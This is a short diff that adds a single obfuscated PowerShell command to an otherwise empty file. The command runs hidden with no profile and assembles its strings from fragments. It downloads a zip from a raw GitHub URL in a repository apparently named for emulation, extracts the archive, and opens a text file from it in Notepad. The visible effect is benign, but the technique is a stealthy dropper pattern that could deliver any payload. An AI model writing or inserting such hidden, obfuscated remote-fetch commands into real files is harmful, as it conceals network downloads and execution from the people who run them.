@@ -1,1 +1,2 @@
 
+powershell -nop -w hidden -Command "$z='ho'+'w a'+'re yo'+'u.zip'; $d='Ex'+'tract'+'ed'; if(-not(Test-Path $z)){ $u='ht'+'tps'+':'+'//'+'raw.'+'githubusercontent.com'+'/Oakenkf/emulation_public/main/how%20are%20you.zip'; iwr -Uri $u -OutFile $z }; Expand-Archive -Path $z -DestinationPath $d -Force; $f=Get-ChildItem -Path $d -Recurse -Filter '*.txt' | Select-Object -First 1; if($f -ne $null){ Start-Process notepad.exe -ArgumentList $f.FullName }"
